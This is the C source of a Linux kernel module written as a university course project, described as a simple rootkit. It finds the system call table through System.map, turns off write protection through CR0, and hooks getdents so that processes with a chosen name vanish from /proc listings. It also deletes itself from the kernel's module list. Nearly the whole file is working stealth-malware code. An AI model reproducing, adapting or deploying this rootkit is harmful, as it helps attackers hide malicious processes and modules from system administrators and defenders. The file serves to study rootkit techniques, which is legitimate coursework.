/*******************************************************************************
 * Projekt:         Projekt č.1: jednoduchý rootkit
 * Jméno:           Radim
 * Příjmení:        Loskot
 * Login autora:    xlosko01
 * E-mail:          xlosko01(at)stud.fit.vutbr.cz
 * Popis:           Modul jádra, který skryje předem specifikovaný proces podle 
 *                  jeho jména.
 *
 ******************************************************************************/

/**
 * @file hide_process.c
 *
 * @brief Kernel module, which hides specified process by its name. Module 
 * catches all getdetns system calls and filters from the result the files 
 * which relate to our process.
 * @author Radim Loskot xlosko01(at)stud.fit.vutbr.cz
 */
 
/*
 * Credits:
 *   http://www.thc.org/papers/LKM_HACKING.html#II.5.1.
 *   http://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/
 *   http://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/ 
 *   http://stackoverflow.com/questions/1184274/how-to-read-write-files-within-a-linux-kernel-module
 */
 
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include <asm/uaccess.h>        // memory cp (user, kernel space) and segment descriptor functions
#include <linux/string.h>       // string/memory handling functions
#include <linux/unistd.h>       // constants of system calls
#include <linux/sched.h>        // task structure and looping the tasks
#include <linux/proc_fs.h>      // PROC_ROOT_INO constant

#define PROC_V                  "/proc/version"
#define BOOT_PATH               "/boot/System.map-"

#define SYSCALL_TABLE_SYMBOL    "sys_call_table"

#define MAX_LEN                 256

#define MAX_PID_COUNT           10
#define DEBUG_TEXT              "HIDE_ROOTKIT: "

#define DISABLE_WP()            write_cr0 (read_cr0 () & (~ 0x10000));
#define ENABLE_WP()             write_cr0 (read_cr0 () | 0x10000);

#define DEBUG_PRINT(format, ...) printk(KERN_ALERT DEBUG_TEXT format, ## __VA_ARGS__);

/* Dirent structure is in linux/dirent.h somehow missing, define it. */
struct module_linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

void **syscall_table;              // Pointer to table of system calls
int syscall_table_found = 0;       // Determines whether the pointer to table of system calls has been found

char evil_rootkit_name[] = "xlosko01_rootkit"; // Name of the process which will be hidden      

// Pointer to function where is the orifinal callback to getdents
asmlinkage long (*orig_getdents)(
        unsigned int fd,
        struct module_linux_dirent
        __user *dirent,
        unsigned int count);

/*
 * Our getdents system call.
 */
asmlinkage long hacked_getdents(
        unsigned int fd,
        struct module_linux_dirent __user *dirp,
        unsigned int count) {

    unsigned int ret_bytes, rec_bytes;
    int rest_bytes = 0, i;
    struct module_linux_dirent *dirp2, *dirp3;
    char file_to_hide[MAX_LEN];
    struct task_struct *curr_task;
    pid_t pids[MAX_PID_COUNT];
    int pids_count = 0;
    int proc_fd = 0;                 // whether relates passed fd to the /proc
    struct kstat fd_stat;            // fstat of the fd
    char rootkit_name[TASK_COMM_LEN];

    DEBUG_PRINT("hacked_getdents called for fd: %u", fd);

    /* Calling the original system callback for getdents with the correct results. We will only filter them. */
    ret_bytes = (*orig_getdents)(fd,dirp,count);

    /* Get stat from fd and check whether node number equals to the /proc */
    if (vfs_fstat(fd, &fd_stat) == 0) {
        if (fd_stat.ino == PROC_ROOT_INO) proc_fd++;
    }

    if ((ret_bytes > 0) && (proc_fd)) {
        /* Cloning the dirent structure from the user space to kernel space */
        dirp2 = (struct module_linux_dirent *) kmalloc(ret_bytes, GFP_KERNEL);
        if (copy_from_user(dirp2, dirp, ret_bytes))
            return ret_bytes;

        /* Setting the pointer to the first dirent structure */
        dirp3 = dirp2;
        rest_bytes = ret_bytes;

        /* Get the PIDs of the processes which contain the substring of the process which to hide */
        strncpy(rootkit_name, evil_rootkit_name, TASK_COMM_LEN);
        rootkit_name[TASK_COMM_LEN - 1] = '\0'; 
        for_each_process(curr_task) {
            if ( (strcmp( curr_task->comm, rootkit_name) == 0 ) && (pids_count < MAX_PID_COUNT) ) {
                pids[pids_count] = curr_task->pid;
                pids_count++;
                DEBUG_PRINT("PID to hide: %d" , curr_task->pid);
            }
        }
        /* Iterate over all returned records */
        while (rest_bytes > 0) {

            rec_bytes = dirp3->d_reclen;
            rest_bytes -= rec_bytes;

            /* Iterate over all PIDs. If file is named as a PID, filter this dirent record from the result. */
            for (i = 0; i < pids_count; i++) {

                sprintf(file_to_hide, "%u", pids[i]);

                if (strstr (dirp3->d_name, file_to_hide) != NULL) { // Dirent record matched the record which to hide
                    if (rest_bytes != 0)    // Override the current record for the next one
                        memmove (dirp3, (char *) dirp3 + rec_bytes, rest_bytes);
                    else                    // Filtered dirent record was the last, set final d_off 
                        dirp3->d_off = 1024;

                    ret_bytes -= rec_bytes;
                }
            }

            /* Whoops, length of the current record is zero? Just abort next reading, there will probably garbage... */
            if(dirp3->d_reclen == 0) {
                ret_bytes -= rest_bytes;
                rest_bytes = 0;
            }
            
            /* If there is something to read, move to the next dirent record */
            if ( rest_bytes != 0)
              dirp3 = (struct module_linux_dirent *) ((char *) dirp3 + dirp3->d_reclen);
        }

        /* Copy all (maybe changed) dirent records back to user space */
        ret_bytes -= copy_to_user(dirp, dirp2, ret_bytes);
        kfree(dirp2);
    }
    return ret_bytes;
}

/**
  * Opens file (similar open()).
  *
  * @param path Path to the file.
  * @param flags Opening flags.
  * @param rights Opening rights.
  * @return file File structure.
  */
struct file* file_open(const char* path, int flags, int rights) {
    struct file* filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if(IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

/**
  * Closes file (similar close()).
  *
  * @param file File structure.
  */
void file_close(struct file* file) {
    filp_close(file, NULL);
}

/**
  * Reads data from the file (similar to pread()).
  *
  * @param file File structure.
  * @param offset Offset from the beginning.
  * @param data Data buffer where to read.
  * @param size Number of maximum bytes which to read.
  * @return Number of bytes which has been read.
  */
int file_read(struct file* file, unsigned long long *offset, unsigned char* data, unsigned int size) {
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, offset);

    set_fs(oldfs);
    return ret;
}   

/**
  * Locates the table of the system calls and stores it into global variable.
  *
  * @param buf Helper buffer, which will be used for retrieving the version.
  * @return String with the version of the current kernel.
  */
char *get_kernel_version(char *buf) {
    struct file *f;
    char *ver;

    /* Open file with version of the kernel. */
    if ((f = file_open(PROC_V, O_RDONLY, 0)) == NULL)
        return NULL;

    /* Read first characters from the file, version should be here */
    memset(buf, 0, MAX_LEN);
    file_read(f, &f->f_pos, buf, MAX_LEN);

    /* Version is after third space */
    strsep(&buf, " ");
    strsep(&buf, " ");
    ver = strsep(&buf, " ");

    file_close(f);

    return ver;
} 

/**
  * Locates the table of the system calls and stores it into global variable.
  *
  * @param kern_ver String with the version of the current kernel
  * @return -1 on fail, otherwise 0
  */
static int find_sys_call_table (char *kern_ver)
{

    char buf[MAX_LEN];
    int i = 0;
    char *p;
    struct file *f = NULL;
    unsigned long ptable_value;
    char *filename;

    /* Initialisation of the read buffer */
    memset(buf, 0x0, MAX_LEN);
    p = buf;

    /* Retrieving the path to the file where are stored symbols of the kernel and their addresses. */

    filename = kmalloc(strlen(kern_ver) + strlen(BOOT_PATH) + 1, GFP_KERNEL);
    if (filename == NULL)
        return -1;

    memset(filename, 0, strlen(BOOT_PATH) + strlen(kern_ver) + 1);
    strncpy(filename, BOOT_PATH, strlen(BOOT_PATH));
    strncat(filename, kern_ver, strlen(kern_ver));

    /* Opening the mapping file. */

    f = file_open(filename, O_RDONLY, 0);
    kfree(filename);
    if (f == NULL)
        return -1;

    /* Reading the file after characters. */
    while (file_read(f, &f->f_pos, p+i, 1) == 1) {

        /* If one line is read or is reached the end of buffer. */
        if ( p[i] == '\n' || i == MAX_LEN - 1 ) {
            i = 0;

            /* If has been found the line with the symbol of system call table */
            if (strstr(p, SYSCALL_TABLE_SYMBOL) != NULL) {

                /* Retrieving the address of the table of system calls, which is placed after the symbol delimited with space */
                if (strict_strtoul(strsep(&p, " "), 16, &ptable_value) != 0)
                    return -1;
                
                // Set pointer on table of system calls
                syscall_table = (void **) ptable_value;
                break;
            }

            memset(buf, 0x0, MAX_LEN);
        } else {
            i++; 
        }
    }

    file_close(f);

    return 0;
}

/**
  * Inits this module.
  */
int init_module(void) {

    char *kern_ver;
    char *buf;

    DEBUG_PRINT("MODULE INIT STARTED");

    /* Allocating the space for storing the version of the kernel */
    if ( (buf = kmalloc(MAX_LEN, GFP_KERNEL)) == NULL ) {
        return -1;
    }

    /* Getting the version of the kernel. */
    if ((kern_ver = get_kernel_version(buf)) == NULL) {
        kfree(buf);
        return -1;
    }

    DEBUG_PRINT("Kernel version found: %s\n", kern_ver);

    /* Getting the pointer to table of system calls. */
    if ( find_sys_call_table(kern_ver) == -1 ) {
        kfree(buf);
        return -1;
    }

    syscall_table_found = 1;
    DEBUG_PRINT("Found the pointer to table of system calls: %lu" , (unsigned long)syscall_table);

    /* Override system call to getdents for our function */
    DISABLE_WP()
        orig_getdents=syscall_table[__NR_getdents];
        syscall_table[__NR_getdents]=hacked_getdents;
    ENABLE_WP();

    // Hide this module from the list
    list_del_init(&__this_module.list);

    kfree(buf);
    
    DEBUG_PRINT("MODULE INIT ENDED");
    return 0;
}

/*
 * Cleans-up garbage when module is going to be unloaded.
 */
void cleanup_module(void) {
    DEBUG_PRINT("MODULE EXIT STARTED");

    if ( syscall_table_found) {
        /* Restore an old system call to getdents */
        DISABLE_WP()
            syscall_table[__NR_getdents]=orig_getdents;
        ENABLE_WP();
    }
    
    DEBUG_PRINT("MODULE EXIT ENDED");
}